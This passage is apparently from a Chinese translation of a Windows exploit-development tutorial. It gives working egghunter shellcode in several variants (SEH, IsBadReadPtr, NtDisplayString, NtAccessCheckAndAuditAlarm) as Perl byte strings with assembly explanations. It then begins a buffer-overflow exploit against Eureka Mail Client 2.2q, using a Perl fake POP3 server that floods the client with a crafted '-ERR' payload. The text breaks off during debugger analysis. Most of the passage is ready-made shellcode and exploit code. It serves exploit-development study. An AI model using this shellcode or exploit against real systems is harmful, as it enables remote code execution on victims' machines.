51 push ecx
6AFF push byte -0x1
33DB xor ebx,ebx
648923 mov [fs:ebx],esp
6A02 push byte +0x2
59 pop ecx
8BFB mov edi,ebx
F3AF repe scasd
7507 jnz 0x20
FFE7 jmp edi
6681CBFF0F or bx,0xfff
43 inc ebx
EBED jmp short 0x10
E8DAFFFFFF call 0x2
6A0C push byte +0xc
59 pop ecx
8B040C mov eax,[esp+ecx]
B1B8 mov cl,0xb8
83040806 add dword [eax+ecx],byte +0x6
58 pop eax
83C410 add esp,byte+0x10
50 push eax
33C0 xor eax,eax
C3 ret
为了利用这段寻蛋代码，你最终的寻蛋代码必须采用下面的格式：
my $egghunter = "\xeb\x21\x59\xb8".
"w00t".
"\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb".
"\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb".
"\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1".
"\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3";
（w00t就是标识。你也可以把w00t写作”\x77\x30\x30\x74”）
Note：随着在 SafeSeh 机制成为新的操作系统或补丁包的事实标准，SHE 注入机制很可能将不再有用武之地。
所以如果你需要在XP SP3， Vista， Win7„„上使用寻蛋技术，你将不得不考虑迂回过safeSeh的方案或者你将不
得不采用其他的寻蛋方案（下面将会谈到一些）。
采用 IsBadReadPtr 的寻蛋方案
寻蛋代码占用37个字节，蛋占用8个字节
33DB xor ebx,ebx
6681CBFF0F or bx,0xfff
43 inc ebx
6A08 push byte +0x8
53 push ebx
B80D5BE777 mov eax,0x77e75b0d
FFD0 call eax
85C0 test eax,eax
75EC jnz 0x2
B890509050 mov eax,0x50905090 ; this is the tag
8BFB mov edi,ebx
AF scasd
75E7 jnz 0x7
AF scasd
75E4 jnz0x7
FFE7 jmp edi
我们最终的寻蛋代码如下：
my $egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08".
"\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8".
"w00t".
"\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";
利用NtDisplayString的寻蛋方案
寻蛋代码占用32个字节，蛋占用8个字节
6681CAFF0F or dx,0x0fff
42 inc edx
52 push edx
6A43 push byte +0x43
58 pop eax
CD2E int 0x2e
3C05 cmp al,0x5
5A pop edx
74EF jz 0x0
B890509050 mov eax,0x50905090 ; this is the tag
8BFA mov edi,edx
AF scasd
75EA jnz 0x5
AF scasd
75E7 jnz 0x5
FFE7 jmp edi
最终的寻蛋代码看起来如下：
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"w00t".
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
这段代码在Immunity的表现如下:
使用 NtAccessCheck（AndAuditAlarm）的寻蛋方案
一个和采用NTDisplayString技术非常类似的方案如下：
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
这个方案使用NTAccessCheckAndAuditAlarm(KiServiceTable中位移值为0x02)函数来代替了NtDisplayString来防止
寻蛋时的访问冲突(access violations).你可以从以下这个位置（或这里）找到更多关于 NtAccessCheck 的信息。
我的朋友Lincoln做了一个不错的关于这个寻蛋方案的Video：你可以到这里看观看。
利用 NtDisplayString/NtAccessCheckAndAuditAlarm 的寻蛋方案的工作原理的简单
介绍
这两个方案使用类似的技术，但不同的系统调用来检查是否有访问冲突(access violation)发生.
NtDisplayDtring函数原型：
NtDisplayString(IN PUNICODE_STRING String );
NtAccessCheckAndAuditAlarm 函数原型:
NtAccessCheckAndAuditAlarm(
IN PUNICODE_STRING SubsystemName OPTIONAL,
IN HANDLE ObjectHandle OPTIONAL,
IN PUNICODE_STRING ObjectTypeName OPTIONAL,
IN PUNICODE_STRING ObjectName OPTIONAL,
IN PSECURITY_DESCRIPTOR SecurityDescriptor,
IN ACCESS_MASK DesiredAccess,
IN PGENERIC_MAPPING GenericMapping,
IN BOOLEAN ObjectCreation,
OUT PULONG GrantedAccess,
OUT PULONG AccessStatus,
OUT PBOOLEAN GenerateOnClose );
（更多函数原型可以在以下地址找到：http://undocumented.ntinternals.net/）
下面是寻蛋函数的详细解释：
6681CAFF0F or dx,0x0fff ; get last address in page
42 inc edx ; acts as a counter
;(increments the value in EDX)
52 push edx ; pushes edx value to the stack
;(saves our current address on the stack)
6A43 push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
; or 0x43 for NtDisplayString to stack
58 pop eax ; pop 0x2 or 0x43 into eax
; so it can be used as parameter
; to syscall - see next
CD2E int 0x2e ; tell the kernel i want a do a
; syscall using previous register
3C05 cmp al,0x5 ; check if access violation occurs
;(0xc0000005== ACCESS_VIOLATION) 5
5A pop edx ; restore edx
74EF je xxxx ; jmp back to start dx 0x0fffff
B890509050 mov eax,0x50905090 ; this is the tag (egg)
8BFA mov edi,edx ; set edi to our pointer
AF scasd ; compare for status
75EA jnz xxxxxx ; (back to inc edx) check egg found or not
AF scasd ; when egg has been found
75E7 jnz xxxxx ; (jump back to "inc edx")
; if only the first egg was found
FFE7 jmp edi ; edi points to begin of the shellcode
(感谢Shahin Ramezany !)
实现寻蛋代码
在这里我们利用Francis Provencher最近在Eureka Mail Client v2.2q中发现的漏洞，你可以自行到网上
下载存在漏洞的程序版本。首先安装这个应用，我们会在后面讲如何配置它。
这个漏洞将会在客户端连接到POP3服务器时被触发。当POP3服务器返回很长的/精心设计的 “-ERR”（注： ERR
是POP3协议的一个命令）数据给客户端，客户端将崩溃同时攻击者可以执行任意的代码。
让我们开始从头构建能在XP SP3英文版（你可以使用VirtualBox）上运行的Exploit。
下面我先用几行perl代码来建立一个假的POP3服务器并返回一个2000字节的（符合metasploit模式）字符串。
首先下载 Immunity Debugger 的 pvefindaddr 插件,把下载的插件安装到 Immunity Debugger 的
pycommands目录，并启动Immunity Debugger.
使用下面的命令在Immunity中生成一个含2000个字符的Metasploit模式的字符串。
!pvefindaddr pattern_create 2000
现在Immunity Debugger目录下，将多出一个名为mspattern.txt的文件，该文件中保存着刚刚生成包含2000个
字符Metasploit模式的字符串。
拷贝这个字符串到剪贴板中。
现在创建攻击用的perl脚本，并使用使用长达2000个字符的字符串作为攻击数据(见$junk变
量)
use Socket;
#Metasploit pattern"
my $junk = "Aa0..."; #paste your 2000 bytes pattern here
my $payload=$junk;
#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host\n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
print "[+] Client connected, sending evil payload\n";
while(1)
{
print CLIENT "-ERR ".$payload."\n";
print " -> Sent ".length($payload)." bytes\n";
}
}
close CLIENT;
print "[+] Connection closed\n";
Notes:
 不要使用2000个A.——使用MetaSploit模式的字符串是很重要的，在后面，我们就会看到这么做的重要性。
 如果2000个字符没有触发溢出/崩溃，改用5000个字符的Metasploit模式的字符串再次尝试。
 这里使用while(1)循环，这时因为并不是只发送一次-ERR数据就能攻击成功的。当然如果你能
找出攻击成功需要的迭代次数那就最好了。不过我喜欢使用无穷循环，因为在大多数时间，他都
能很好的工作。:-)
运行perl脚本，我们将看到如下输出：
现在启动Eureka Mail Client. 选择菜单”Options”->”Connection settings”,在POP3 server编辑框中填入运行perl脚
本(模拟POP3功能)的主机的IP地址.在我的实验中，运行冒充的perl POP3服务器的IP地址是192.168.0.193.所以我
得配置如下图：
（你还必须输入POP 用户名和密码，不过你可以输入任何你想输入的东西。）让后保存配置信息。
现在附加(attach)Immunity Debugger Eureka Email，并运行。
回到Email客户端，然后选择”File”菜单，让后选择”Send And receive emails”子菜单。
客户端应用出现了异常。现在我们可以停止了Perl脚本（它还在无穷循环里打转呢）了。观察Immunity Debugget
日志和寄存器：“Access violation when executing [37784136]”。
寄存器窗口内容如下图：
现在运行下面的命令：
!pvefindaddr suggest